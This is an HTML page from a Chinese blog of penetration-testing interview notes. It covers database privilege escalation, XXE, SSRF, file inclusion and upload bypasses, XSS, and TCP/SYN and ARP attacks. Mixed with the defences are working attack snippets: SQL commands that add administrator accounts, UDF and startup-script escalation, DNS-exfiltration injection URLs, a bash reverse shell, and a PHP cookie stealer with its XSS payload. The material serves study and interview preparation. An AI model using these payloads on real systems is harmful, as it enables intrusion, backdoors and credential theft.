@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    渗透测试面试总结(三) |
+    
+    Melon</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-渗透测试面试试题(三)" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试面试总结(三)
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%B8%89)/" class="article-date">
+  <time datetime="2019-12-23T07:00:11.000Z" itemprop="datePublished">2019-12-23</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>关于面试的一些总结。</p>
+<a id="more"></a>
+
+<p><strong>1.mssql 提权的提权思路有哪些步骤？</strong></p>
+<p>（1）首先看看 xp_cmdshel 是否 l 存在,不存在的话先恢复，恢复语句如下：</p>
+<p>Exec sp_configure show advanced options,1;RECONFIGURE;EXEC </p>
+<p>sp_configure xp_cmdshell,1;RECONFIGURE;</p>
+<p>EXEC sp_configure show advanced options, 1;RECONFIGURE;</p>
+<p>EXEC sp_configure xp_cmdshell, 1;RECONFIGURE;–</p>
+<p>（2）如果 xp_cmdshell 还是不行就再执行命令;dbcc addextendedproc(“xp_cmdshell”,”xplog70.dll”);–或;sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll 来恢复cmdshell</p>
+<p>（3）无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指</p>
+<p>定的程序。)</p>
+<p>恢复方法：查询分离器连接后,</p>
+<p>第一步执行:exec sp_dropextendedproc xp_cmdshell</p>
+<p>第二步执行:exec sp_addextendedproc xp_cmdshell,xpweb70.dll</p>
+<p>然后按 F5 键命令执行完毕</p>
+<p>（4）终极方法如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:</p>
+<p>查询分离器连接后,</p>
+<p>2000servser 系统:</p>
+<p>declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net user dell huxifeng007 /add</p>
+<p>declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net localgroup administrators dell /add</p>
+<p>sql2008 提权 低权限运行</p>
+<p><strong>2、mssql 提权提示错误代码 5，cmd 权限不足的原因？</strong></p>
+<p>错误代码”5″，马上 google 之。由于 xp_cmdshell 是严格用%systemroot%\system32\cmd.exe 去执行所提交的命令的，提示”5″，意思是 cmd 的权限不足，就是说 system32 下的 cmd.exe 被降权了。当然也有绕过的方法，比如启用沙盒模式执行 shell 命令：</p>
+<p><strong>3.怎么用 sqlmap 对 sa 权限的 mssql 2008 进行提权？</strong></p>
+<p>（1）第一种函数</p>
+<p>select name from sysobjects where xtype=u 通过这个来爆第一个表</p>
+<p>select name from sysobjects where xtype=u and name not in(爆出来的表1，爆出来的表 2…)一直爆下去，直到找到我们所需要的表位置</p>
+<p>（2）第二种函数select table_name from information_schema.tables select table_name from information_schema.tables where table_name not in (爆出来的表 1，爆出来的表 2…)</p>
+<p>参考文章：<a href="http://www.freebuf.com/articles/web/10280.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/10280.html</a></p>
+<p><strong>4.xxe 注入有哪些危害以及防御 ？</strong></p>
+<p>(1)引用外部实体<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;或者 &lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code>当允许引用外部实体时，通过构造恶意内容</p>
+<p>(2)可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。对于不同 XML 解析器,对外部实体有不同处理规则,在 PHP 中默认处理的函数为: xml_parse 和 simplexml_load xml_parse 的实现方式为 expat 库，默认情况不会解析外部实体,而 simplexml_load 默认情况下会解析外部实体,造成安全威胁. 除 PHP 外，在 Java，Python 等处理 xml 的组件及函数中都可能存在此问题.</p>
+<p>（3）防御：</p>
+<p>方案一、使用开发语言提供的禁用外部实体的方法</p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>方案二、过滤用户提交的 XML 数据</p>
+<p>1.检查所使用的底层 xml 解析库，默认禁止外部实体的解析</p>
+<p>2.使用第三方应用代码及时升级补丁</p>
+<p>3.同时增强对系统的监控，防止此问题被人利用</p>
+<p>对于 PHP,由于 simplexml_load_string 函数的 XML 解析问题出在 libxml 库上,所以加载实体前可以调用这样一个函数</p>
+<p><strong>5.gpc 魔术引号？</strong></p>
+<p>在 PHP 中是默认打开“魔术引号（Magic Quote）GPC”的。开启magic_quote_gpc=on之后,相当于使用addslshes()这个函数。</p>
+<p>魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。<br>一、什么是魔术引号<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。</p>
+<p><strong>6.MYSQL 有哪些提权方法？</strong></p>
+<p>（1）UDF 提权</p>
+<p>这类提权方法我想大家已经知道了，我大致写一下，具体语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname ’udf.dll’</span><br><span class="line"></span><br><span class="line">select cmdshell(’net user iis_user 123!@#abcABC /add’);</span><br><span class="line"></span><br><span class="line">select cmdshell(’net localgroup administrators iis_user /add’);</span><br><span class="line"></span><br><span class="line">select cmdshell(’regedit /s d:web3389.reg’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br><span class="line"></span><br><span class="line">select cmdshell(’netstat -an’);</span><br></pre></td></tr></table></figure>
+
+<p>（2）VBS 启动项提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text);</span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; );</span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user iis_user </span><br><span class="line">123!@#abcABC/add&quot;&quot;,0)&quot;);</span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators iis_user /add&quot;&quot;,0)&quot;);</span><br><span class="line">select * from a into outfile &quot;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（3）Linx MySQL BackDoor 提权</p>
+<p>Linx Mysql Door</p>
+<p>Mysql BackDoor 是一款针对 PHP+Mysql 服务器开发的后门,该后门安装后为Mysql增加一个可以执行系统命令的”state”函数,并且随Mysql进程启动一个基于 Dll 的嗅探型后门,这个后门在 Windows 下拥有与 Mysql 一样的系统权限,从而巧妙的实现了无端口,无进程,无服务的穿墙木马.</p>
+<p>用法：将 Mysql.php 传到 PHP 服务器上,点击”自动安装 Mysql BackDoor”，然后直接执行命令即可</p>
+<p>（4）MIX.DLL 提权</p>
+<p>1.在独立 IP 的 sqlmap 下运</p>
+<p>2.禁用本地缓存 net stop dns</p>
+<p>3.<a href="http://localhost/inject.php?user=123&#39;" target="_blank" rel="noopener">http://localhost/inject.php?user=123&#39;</a> and if((SELECT LOAD_FILE(CONCAT(‘\‘,(SELECT hex(user())),’.abc.com\foobar’))),1,1)%23</p>
+<p><a href="http://localhost/inject.php?user=123&#39;" target="_blank" rel="noopener">http://localhost/inject.php?user=123&#39;</a> and if((SELECT LOADFILE(CONCAT(‘\‘,(SELECT concat(user,’’,mid(password,2,41)) from user where user=’root’ limit 1),’.md5crack.cn\foobar’))),1,1)%23</p>
+<p>4.DNS 突破</p>
+<p>参考文章：<a href="http://www.freebuf.com/vuls/85021.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/85021.html</a></p>
+<p><strong>7.什么叫 ssrf 以及 ssrf 的防御？</strong></p>
+<p>(1)SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统</p>
+<p>(2)SSRF 统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</p>
+<p>1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等</p>
+<p>2.黑名单内网 IP。</p>
+<p>3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS.</p>
+<p><strong>8.如何利用 php 的远程命令执行函数进行反弹 nc?</strong></p>
+<p>system,exec,shell_exec,paassthru,popen,proc_popen,反弹 shell 公网服务器执行 nc –lvv 8888目标服务器上执行<code>?cmd= bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1</code>并在 disabl_functions 中禁用</p>
+<p><strong>9.文件包含漏洞可以用来做啥，以及需要主要注意的事项？</strong></p>
+<p>（1）配合文件上传漏洞 GetShell，可以执行任意脚本代码，网站源码文件以及配置文件泄露，远程包含 GetShel， 控制整个网站甚至是服务器</p>
+<p>（2）allow_url_fopen 和 allow_url_include 为 ON 的话，则包含的文件可以是</p>
+<p>第三方服务器中的文件，这样就形成了远程文件包含漏洞（3）/etc/passwd • 需要 magic_quotes_gpc=off,PHP 小于 5.3.4 有效</p>
+<p>（4）/etc/passwd././././././././././././.[……]/././././././././.</p>
+<p>（5）php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows需要长于 256index.php?page=php://filter/read/=convert.base64-encode/resource=index.php</p>
+<p><strong>10.文件上传有哪些技巧？</strong></p>
+<p>通过抓包截断将 eval.php.jpg 换成 eval.php_jpg(下划线为 0x00)。在上传文件时系统文件遇到 0x00。会认为文件已经结束。从而将 eval.php.jpg 的内容写入到 eval.php 中 .htaccess 文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “haha”&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件函数检测 jpg(JFIF) gif(GIF89a) png(%PNG) </p>
+<p>apache 解析漏洞，2.0-2.2 IIS7.5 解析漏洞，任意文件名后加.php nginx&lt;0.8.32 1.jpg/1.phpnginx&gt;0.8.41&lt;1.5.6,1.jpg%20.php 解析**SQL 注入（Sql Injection ）是一种将 SQL 语句插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行。</p>
+<p><strong>11.HTTP 协议 head 方法的功能与 get 方法不同之处是？</strong></p>
+<p>不同之处在于服务器不会在其相应中返回消息主体。</p>
+<p>• TRACE。这种方法主要用于诊断。</p>
+<p>• OPTIONS。这种方法要求服务器报告对某一特殊资源有效的 HTTP 方法。</p>
+<p>• PUT。这个方法试图使用包含在请求主体中的内容，向服务器上传制定的资源</p>
+<p>** 各种注释#– – - –+ // /**/ 空白字符，+号，-号，～号，！号，@形式 {} %0a—————————–</p>
+<p><strong>12.域和组的区别是什么？</strong></p>
+<p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。为什么是这样的呢？因为在加入域的时候，管理员为每个计算机在域中（可和用户不在同一域中）建立了一个计算机帐户，这个帐户和用户帐户一样，也有密码保护的。可是大家要问了，我没有输入过什么密码啊，是的，你确实没有输入，计算机帐户的密码不叫密码，在域中称为登录凭据，它是由 2000 的 DC（域控制器）上的 KDC 服务来颁发和维护的。为了保证系统的安全，KDC 服务每 30 天会自动更新一次所有的凭据，并把上次使用的凭据记录下来。周而复始。也就是说服务器始终保存着 2 个凭据，其有效时间是 60 天，60 天后，上次使用的凭据就会被系统丢弃。如果你的 GHOST 备份里带有的凭据是 60 天的，那么该计算机将不能被 KDC 服务验证，从而系统将禁止在这个计算机上的任何访问请求（包括登录），解决的方法呢，简单的方法使将计算机脱离域并重新加入，KDC 服务会重新设置这一凭据。或者使用 2000 资源包里的 NETDOM 命令强制重新设置安全凭据。因此在有域的环境下，请尽量不要在计算机加入域后使用 GHOST备份系统分区，如果作了，请在恢复时确认备份是在 60 天内作的，如果超出，就最好联系你的系统管理员，你可以需要管理员重新设置计算机安全凭据，否则你将不能登录域环境。域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。</p>
+<p><strong>13.对称加密非对称加密？</strong></p>
+<p>对称加密：加解密用同一密钥，密钥维护复杂 n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效率低，应用于数字签名及加密。</p>
+<p><strong>14.什么是同源策略？</strong></p>
+<p>为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。浏览器不允许任何旧有脚本访问一个站点的 cookie，否则 ，会话容易被劫持。只有发布 cookie 的站点能够访问这些 cookie，只有通过该站点返回的页面所包含或加载的 JavaScript 才能访问 cookie。协议相同，域名相同，端口相同</p>
+<p><strong>15.cookie 存在哪里？可以打开吗?</strong></p>
+<p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies</p>
+<p>工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到 cookies 文件夹。</p>
+<p><strong>16.xss 如何盗取 cookie？</strong></p>
+<p>攻击者代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&apos;cookie&apos;];</span><br><span class="line"></span><br><span class="line">$time=date(&apos;Y-m-d g:i:s&apos;);</span><br><span class="line"></span><br><span class="line">$referer=getenv(&apos;HTTP_REFERER&apos;);</span><br><span class="line"></span><br><span class="line">$cookietxt=fopen(&apos;cookie.txt&apos;,&apos;a&apos;);</span><br><span class="line"></span><br><span class="line">fwrite($cookietxt,&quot;time:&quot;.$time.&quot; cookie:&quot;.$cookie.&quot; referer:&quot;.$referer.&quot;&quot;); </span><br><span class="line"></span><br><span class="line">fclose($cookietxt);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>脚本端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">document.write(&apos;&lt;img </span><br><span class="line"></span><br><span class="line">src=&quot;http://ip/cookie.php?cookie=&apos;+document.cookie+&apos;&quot; width=0 height=0 border=0 /&gt;&apos;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取到 cookie 后，用 firebug 找到 cookie，新建 cookie</p>
+<p>加入 cookie，用 referer 来提交，无需输入帐号密码直接登录进去！</p>
+<p><strong>17.tcp、udp 的区别及 tcp 三次握手，syn 攻击？</strong></p>
+<p>也可参考<a href="http://www.cnblogs.com/bizhu/archive/2012/05/12/2497493.html" target="_blank" rel="noopener">http://www.cnblogs.com/bizhu/archive/2012/05/12/2497493.html</a></p>
+<p>（1）tcp、udp 区别</p>
+<p>TCP 的优点：</p>
+<p>可靠，稳定</p>
+<p>TCP 的可靠体现在 TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。</p>
+<p>TCP 的缺点：</p>
+<p>慢，效率低，占用系统资源高，易被攻击</p>
+<p>TCP 在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的 CPU、内存等硬件资源。而且，因为 TCP 有确认机制、三次握手机制，这些也导致 TCP 容易被人利用，实现 DOS、DDOS、CC 等攻击。</p>
+<p>UDP 的优点：</p>
+<p>快，比 TCP 稍安全</p>
+<p>UDP 没有 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议，所以它在传递数据时非常快。没有 TCP 的这些机制，UDP 较 TCP被攻击者利用的漏洞就要少一些。但 UDP 也是无法避免攻击的，比如：UDP Flood 攻击……</p>
+<p>UDP 的缺点：</p>
+<p>不可靠，不稳定</p>
+<p>因为 UDP 没有 TCP 那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。基于上面的优缺点，那么：</p>
+<p>什么时候应该使用 TCP：当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如 HTTP、HTTPS、FTP 等传输文件的协议，POP、SMTP 等邮件传输的协议。</p>
+<p>在日常生活中，常见使用 TCP 协议的应用如下：浏览器，用的 HTTPFlashFXP，用的 FTP Outlook，用的 POP、SMTP Putty，用的 Telnet、SSH QQ 文件传输</p>
+<p>什么时候应该使用 UDP：</p>
+<p>当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用 UDP。比如，日常生活中，常见使用 UDP 协议的应用如下：QQ 语音 QQ 视频 TFTP</p>
+<p>（2）TCP 握手协议</p>
+<p>在 TCP/IP 协议中，TCP 协议提供可靠的连接服务，采用三次握手建立一个连接。</p>
+<p>第一次握手：建立连接时，客户端发送 syn 包(syn=j)到服务器，并进入SYN_SEND 状态，等待服务器确认；</p>
+<p>第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；</p>
+<p>第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包</p>
+<p>ACK(ack=k+1)，此包发送完毕，客户端和服务器进入 ESTABLISHED 状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的</p>
+<p>概念：</p>
+<p>未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的 SYN 包（syn=j）开设一个条目，该条目表明服务器已收到 SYN 包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于 Syn_RECV 状态，当服务器收到客户的确认包时，删除该条目，服务器进入 ESTABLISHED 状态。</p>
+<p>backlog 参数：表示未连接队列的最大容纳数目。</p>
+<p>SYN-ACK 重传次数 服务器发送完 SYN－ACK 包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。</p>
+<p>半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到 SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为 Timeout 时间、SYN_RECV 存活时间。</p>
+<p>（3）SYN 攻击原理</p>
+<p>SYN 攻击属于 DOS 攻击的一种，它利用 TCP 协议缺陷，通过发送大量的半连接请求，耗费 CPU 和内存资源。</p>
+<p>SYN 攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN 攻击并不管目标是什么系统，只要这些系统打开 TCP 服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV 状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。</p>
+<p>配合 IP 欺骗，SYN 攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 syn 包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。</p>
+<p><strong>18.证书要考哪些？</strong></p>
+<p>信息安全国际第一认证——CISSP</p>
+<p>信息安全国内认证——CISAW</p>
+<p>信息安全国内认证——CISP</p>
+<p>信息安全技术实操认证新贵——Security+</p>
+<p>IT 审计人员的必备之证——CISA= </p>
+<p><strong>19.DVWA 是如何搭建的？</strong></p>
+<p>下载源码配数据库install或者docker</p>
+<p><strong>20.渗透测试的流程是什么？</strong></p>
+<p>渗透测试流程概述</p>
+<p>前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。</p>
+<p>攻击前：网络踩点、网络扫描、网络查点</p>
+<p>攻击中：利用漏洞信息进行渗透攻击、获取权限</p>
+<p>攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除</p>
+<p><strong>21.xss 如何防御？</strong></p>
+<p>1.对前端输入做过滤和编码：比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的；对特殊字符进行过滤和转义；</p>
+<p>2.对输出做过滤和编码：在变量值输出到前端的 HTML 时进行编码和转义；3.给关键 cookie 使用 http-only</p>
+<p><strong>22.IIS 服务器应该做哪些方面的保护措施？</strong></p>
+<p>整理来源：<a href="http://www.williamlong.info/archives/118.html" target="_blank" rel="noopener">http://www.williamlong.info/archives/118.html</a></p>
+<ol>
+<li>保持 Windows 升级:</li>
+<li>使用 IIS 防范工具</li>
+<li>移除缺省的 Web 站点</li>
+<li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li>
+<li>有规则地检查你的管理员组和服务:</li>
+<li>严格控制服务器的写访问权限</li>
+<li>设置复杂的密码</li>
+<li>减少/排除 Web 服务器上的共享</li>
+<li>禁用 TCP/IP 协议中的 NetBIOS:</li>
+<li>使用 TCP 端口阻塞</li>
+<li>仔细检查<em>.bat 和</em>.exe 文件: 每周搜索一次*.bat</li>
+<li>管理 IIS 目录安全:</li>
+<li>使用 NTFS 安全:</li>
+<li>管理用户账户</li>
+<li>审计你的 Web 服务器: </li>
+</ol>
+<p><strong>23.什么叫 CC 攻击？</strong></p>
+<p>攻击者借助代理服务器生成指向受害主机的合法请求，实现 DDOS,和伪装就叫：CC(ChallengeCollapsar)。CC 主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库就越大，被访问的频率也越高，占用的系统资源也就相当可观。</p>
+<p>一个静态页面不需要服务器多少资源，甚至可以说直接从内存中读出来发给你就可以了，但是论坛就不一样了，我看一个帖子，系统需要到数据库中判断我是否有读帖子的权限，如果有，就读出帖子里面的内容，显示出来——这里至少访问了 2 次数据库，如果数据库的数据容量有 200MB 大小，系统很可能就要在这200MB 大小的数据空间搜索一遍，这需要多少的 CPU 资源和时间？如果我是查找一个关键字，那么时间更加可观，因为前面的搜索可以限定在一个很小的范围内，比如用户权限只查用户表，帖子内容只查帖子表，而且查到就可以马上停止查询，而搜索肯定会对所有的数据进行一次判断，消耗的时间是相当的大。CC 就是充分利用了这个特点，模拟多个用户（多少线程就是多少用户）不停的进行访问（访问那些需要大量数据操作，就是需要大量 CPU 时间的页面）.这一点用一个一般的性能测试软件就可以做到大量模拟用户并发。</p>
+<p><strong>24.虚拟机的几种连接方式及原理？</strong></p>
+<p>整理来源：<a href="http://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">http://blog.csdn.net/shuxiao9058/article/details/7051463</a></p>
+<p>安装完虚拟机后，默认安装了两个虚拟网卡，VMnet1 和 VMnet8，其他的未安装（当然也可以手动安装其他的）。其中 VMnet1 是 host 网卡，用于 host 方式连接网络的。VMnet8 是 NAT 网卡，用于 NAT 方式连接网络的。它们的 IP 地址是随机生成的，如果要用虚拟机做实验的话，最好将 VMnet1 到 VMnet8 的 IP 地址改掉。习惯上把 VMware 虚拟网卡使用的网段”固定”，使用如下原则：VMnet1 对应的网段是 192.168.10.0，VMnet2 对应的网段是 192.168.20.0，其他的类似。当然平常只是随便用用的就不用改了，能上网就行了。</p>
+<p>VMware 网络连接的方式主要有：桥接（Bridged）、NAT、主机网络（Host-Only）。</p>
+<ol>
+<li>Use bridged networking（使用桥接网络）</li>
+</ol>
+<p>说明：使用 VMnet0 虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的 IP 地址，其网络拓扑如图 1 所示，使用桥接方式，A，A1，A2，B 可互访。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware1.png" alt="html">    </p>
+<ol start="2">
+<li>Use network address translation（NAT）</li>
+</ol>
+<p>说明：使用 Vmnet8 虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。其网络拓扑如图 2 所示，使用 NAT 方式，A1，A2 可以访问 B，但 B 不可以访问 A1，A2。但 A，A1，A2 可以互访。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware2.png" alt="html">    </p>
+<ol start="3">
+<li>Use Host-Only networking（使用主机网络）</li>
+</ol>
+<p>说明：使用 Vmnet1 虚拟交换机，此时虚拟机只能与虚拟机、主机互访。也就是不能上 Internet，其网络拓扑如图 3 所示，使用 Host 方式，A，A1，A2 可以互访，但 A1，A2 不能访问 B，也不能被 B访问。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VMware3.png" alt="html">    </p>
+<p><strong>25.xss 有 cookie 一定可以无用户名密码登录吗？</strong></p>
+<p>基本可以。因为把 cookie 的值给浏览器，浏览器去访问页面会用已有的 cookie去访问，如果 cookie 有效，就会直接进去。</p>
+<p><strong>26.SSL Strip(SSp)攻击到底是什么？</strong></p>
+<p>SSL 协议(Secure Socket Layer，安全套接层)主要是使用公开密钥体制和 X.509数字证书技术保护信息传输的机密性和完整性，它不能保证信息的不可抵赖性，主要适用于点对点之间的信息传输，常用 Web Server 方式。</p>
+<p>详细解释 <a href="http://hover.blog.51cto.com/258348/218841" target="_blank" rel="noopener">http://hover.blog.51cto.com/258348/218841</a></p>
+<p><strong>27.中间人攻击——ARP 欺骗的原理、实战及防御？</strong></p>
+<p>(1）什么是网关</p>
+<p>首先来简单解释一下什么是网关，网关工作在 OSI 七层模型中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。</p>
+<p>（2）ARP 协议是什么</p>
+<p>ARP（Address Resolution Protocol）地址转换协议，工作在 OSI 模型的数据链路层，在以太网中，网络设备之间互相通信是用 MAC 地址而不是 IP 地址，ARP 协议就是用来把 IP 地址转换为 MAC 地址的。而 RARP 和 ARP 相反，它是反向地址转换协议，把 MAC 地址转换为 IP 地址。</p>
+<p>假设 A(192.168.1.2)与 B(192.168.1.3)在同一局域网，A 要和 B 实现通信。A 首先会发送一个数据包到广播地址(192.168.1.255)，该数据包中包含了源 IP（A）、源 MAC、目的 IP（B）、目的 MAC，这个数据包会被发放给局域网中所有的主机，但是只有 B 主机会回复一个包含了源 IP（B）、源 MAC、目的 IP（A）、目的 MAC 的数据包给 A，同时 A 主机会将返回的这个地址保存在 ARP 缓存表中。</p>
+<p>（3）ARP 欺骗原理</p>
